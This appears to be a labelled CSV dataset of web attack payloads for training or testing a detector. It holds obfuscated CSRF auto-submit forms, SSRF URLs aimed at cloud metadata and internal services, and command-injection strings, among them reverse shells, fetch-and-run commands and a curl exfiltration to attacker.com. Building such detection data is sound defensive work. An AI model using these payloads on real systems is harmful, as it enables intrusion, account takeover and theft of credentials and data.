payload,label
<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>,Suspicious Activity
<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>,Suspicious Activity
<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://payments.example.com/account/add-card' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>,Suspicious Activity
<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>,Suspicious Activity
"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();<\/script>');d.close();</script>",Suspicious Activity
<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Suspicious Activity
"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>",Suspicious Activity
"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>",Suspicious Activity
<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Suspicious Activity
"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>",Suspicious Activity
<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Suspicious Activity
"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();<\/script>';</script>",Suspicious Activity
<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>,Suspicious Activity
"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>",Suspicious Activity
<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>,Suspicious Activity
"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>",Suspicious Activity
"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>",Suspicious Activity
<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Suspicious Activity
"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>",Suspicious Activity
"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>",Suspicious Activity
<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>,Suspicious Activity
"<script>var s=['ht','tp','s:','//','target','.com','/api','/evil'].join('');var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>",Suspicious Activity
http://127.0.0.1/,SSRF
http://192.168.1.1/,SSRF
http://169.254.169.254/latest/meta-data/,SSRF
http://metadata.google.internal/computeMetadata/v1/,SSRF
http://169.254.169.254/metadata/instance?api-version=2021-02-01,SSRF
redis://127.0.0.1:6379,SSRF
memcached://127.0.0.1:11211,SSRF
ftp://127.0.0.1/,SSRF
smb://192.168.1.100/share,SSRF
http://127.0.0.1:2375/containers/json,SSRF
https://kubernetes.default.svc/api,SSRF
http://127.0.0.1:8080/api/json,SSRF
http://127.0.0.1:9200/_cat/indices?v,SSRF
http://127.0.0.1:15672/api/overview,SSRF
mysql://127.0.0.1:3306,SSRF
postgresql://127.0.0.1:5432,SSRF
smtp://127.0.0.1:25,SSRF
snmp://127.0.0.1,SSRF
ldap://127.0.0.1:389,SSRF
http://127.0.0.1/../../../../etc/passwd,SSRF
http://%31%39%32.%31%36%38.%31.%31/,SSRF
http://0300.0250.0001.0001/,SSRF
http://3232235777/,SSRF
http://[::1]/,SSRF
file:///etc/passwd,SSRF
gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,SSRF
"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4=",SSRF
javascript:alert('SSRF'),SSRF
file:///proc/self/environ,SSRF
http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd,SSRF
ftp://127.0.0.1/../../../../etc/passwd,SSRF
smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts,SSRF
http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,SSRF
"http://127.0.0.1:80/\r
X-Injected-Header: evil",SSRF
http://admin:password@127.0.0.1/admin,SSRF
http://external.com/redirect?url=http://127.0.0.1/,SSRF
http://evil.com/,SSRF
http://[::ffff:127.0.0.1]/,SSRF
http://127.0.0.1/%0a%0d,SSRF
http://127.0.0.1/?_method=POST,SSRF
http://127.0.0.1/chunked,SSRF
http://127.0.0.1/trace,SSRF
http://127.0.0.1/options,SSRF
http://127.0.0.1/connect,SSRF
http://127.0.0.1/patch,SSRF
http://127.0.0.1/delete,SSRF
http://127.0.0.1/put,SSRF
http://127.0.0.1/put,SSRF
"http://127.0.0.1/\r
X-Forwarded-For: 127.0.0.1",SSRF
http://127.0.0.1@evil.com/,SSRF
dict://127.0.0.1/,SSRF
telnet://127.0.0.1:23,SSRF
"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid",SSRF
rdp://127.0.0.1:3389,SSRF
smb://127.0.0.1/share,SSRF
nfs://127.0.0.1/export,SSRF
imap://127.0.0.1:143,SSRF
pop3://127.0.0.1:110,SSRF
mqtt://127.0.0.1:1883,SSRF
ws://127.0.0.1:8080/,SSRF
wss://127.0.0.1:8443/,SSRF
bitcoin://127.0.0.1/,SSRF
magnet:?xt=urn:btih:abcdef1234567890,SSRF
ssh://127.0.0.1:22,SSRF
tel:+1234567890,SSRF
sms:+1234567890,SSRF
"geo:37.786971,-122.399677",SSRF
svn://127.0.0.1/repo,SSRF
git://127.0.0.1/repo.git,SSRF
sftp://127.0.0.1/home/user/,SSRF
http://%2531%25327%2532%253E%253E%253E/,SSRF
HtTp://127.0.0.1/,SSRF
http://127.0.0.1%00.example.com/,SSRF
"http://127.0.0.1/\r
Set-Cookie:evil=1",SSRF
gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,SSRF
http://[::ffff:192.168.1.1]:8080/,SSRF
http://evil.com/,SSRF
http://127.0.0.1/%0d%0aX-Injected-Header:evil,SSRF
http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,SSRF
file:///etc/passwd%00,SSRF
http://admin%3Apassword@127.0.0.1/,SSRF
http://external.com/redirect?url=http://127.0.0.1/,SSRF
http://127.0.0.1/?_method=POST,SSRF
http://127.0.0.1/chunked,SSRF
http://127.0.0.1/trace,SSRF
http://127.0.0.1/options,SSRF
http://127.0.0.1/connect,SSRF
http://127.0.0.1/patch,SSRF
http://127.0.0.1/delete,SSRF
http://127.0.0.1/put,SSRF
http://0x7f.0x0.0x0.0x1/,SSRF
http://127.1/,SSRF
http://2130706433/,SSRF
http://127.0.0.1@evil.com/,SSRF
http://127.0.0.1/#fragment,SSRF
http://127.0.0.1/?param=value,SSRF
http://127.0.0.1/../../../../etc/passwd,SSRF
http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd,SSRF
http://127.0.0.1/%2f%2f/etc/passwd,SSRF
http://%31%32%37.%30.%30.%31/%2E%2E/%2e%2e/%2E%2e/etc/passwd,SSRF
; ls -la,Command Injection
&& cat /etc/passwd,Command Injection
| whoami,Command Injection
id,Command Injection
$(uname -a),Command Injection
$(echo $(whoami)),Command Injection
& sleep 10,Command Injection
"&& echo 'injected'
",Command Injection
; curl http://attacker.com,Command Injection
; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Command Injection
| nc attacker.com 4444 -e /bin/sh,Command Injection
whoami,Command Injection
$(id),Command Injection
; echo injected,Command Injection
&& cat /etc/shadow,Command Injection
; id,Command Injection
| env,Command Injection
ls /,Command Injection
$(ps aux),Command Injection
; whoami,Command Injection
%3B%20id,Command Injection
`echo \whoami\`,Command Injection
; echo $USER,Command Injection
; echo\x20injected,Command Injection
; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Command Injection
$(sleep 10),Command Injection
; echo $(whoami),Command Injection
; echo injected\; ls,Command Injection
; ls -la && whoami || echo failed,Command Injection
; (id; uname -a),Command Injection
; (sleep 5),Command Injection
; ls -la #,Command Injection
echo $(whoami),Command Injection
; echo $PATH,Command Injection
$(echo injected),Command Injection
; (echo injected; whoami),Command Injection
; sleep 15,Command Injection
| nc attacker.com 4444 -e /bin/sh,Command Injection
; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Command Injection
; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Command Injection
; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Command Injection
; export MALICIOUS=1,Command Injection
; echo 'malicious' > /tmp/malicious.txt,Command Injection
; chmod +x /tmp/m.sh,Command Injection
; cat /etc/shadow,Command Injection
; echo 'injected; ls -la',Command Injection
"; echo ""$(whoami)""",Command Injection
"; awk 'BEGIN {system(""id"")}'",Command Injection
; perl -e 'print id',Command Injection
"; python -c 'import os; os.system(""id"")'",Command Injection
& whoami,Command Injection
| dir,Command Injection
&& ipconfig,Command Injection
|| net user,Command Injection
; Get-Process,Command Injection
whoami,Command Injection
$(Get-ChildItem),Command Injection
; Start-Process notepad.exe,Command Injection
& echo injected > C:\Windows\Temp\injected.txt,Command Injection
& nc attacker.com 4444 -e cmd.exe,Command Injection
; whoami,Command Injection
| id,Command Injection
&& uname -a,Command Injection
ls /,Command Injection
$(ps aux),Command Injection
; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Command Injection
; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Command Injection
; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Command Injection
; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=,Command Injection
"& for /L %i in (1,1,5) do @echo %i",Command Injection
; Invoke-Expression 'whoami',Command Injection
; env,Command Injection
; cat /etc/passwd,Command Injection
& reg query HKLM\Software,Command Injection
; Get-Content C:\Windows\System32\drivers\etc\hosts,Command Injection
; dmesg,Command Injection
; netstat -an,Command Injection
& tasklist,Command Injection
; Get-Service,Command Injection
; ps aux,Command Injection
& echo injected | findstr injected,Command Injection
; Start-Process notepad.exe -WindowStyle Hidden,Command Injection
; curl http://attacker.com/?data=$(cat /etc/passwd),Command Injection
& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Command Injection
; nc attacker.com 4444 -e /bin/bash,Command Injection
& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe,Command Injection
; bash -i >& /dev/tcp/attacker.com/4444 0>&1,Command Injection
; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1,Command Injection
"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",Command Injection
& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ==,Command Injection
; e${IFS}cho injected,Command Injection
; echo \u0069\u006E\u006A\u0065\u0063\u0074\u0065\u0064,Command Injection
%253B%2520id,Command Injection
; VAR=whoami; $VAR,Command Injection
; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash,Command Injection
"&& echo injected
id",Command Injection
; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Command Injection
"; echo $(echo ""$(whoami)"")",Command Injection
; export CMD=whoami; ${CMD},Command Injection
"; awk 'BEGIN {system(""id"")}'",Command Injection
